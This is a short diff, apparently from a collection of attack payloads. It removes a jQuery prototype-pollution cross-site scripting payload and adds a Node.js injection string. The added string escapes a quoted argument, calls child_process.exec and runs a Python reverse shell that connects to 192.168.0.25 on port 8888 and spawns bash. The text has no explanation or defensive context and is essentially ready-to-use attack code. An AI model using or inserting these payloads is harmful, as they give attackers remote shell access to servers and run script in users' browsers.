@@ -1,5 +1,1 @@
-	<script>
-Object.prototype.div=['1','<img src onerror=alert(1)>','1']
-</script><script>
-$('<div x="x"></div>')
-</script>
+\');require("child_process").exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.25\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'");req.end();//
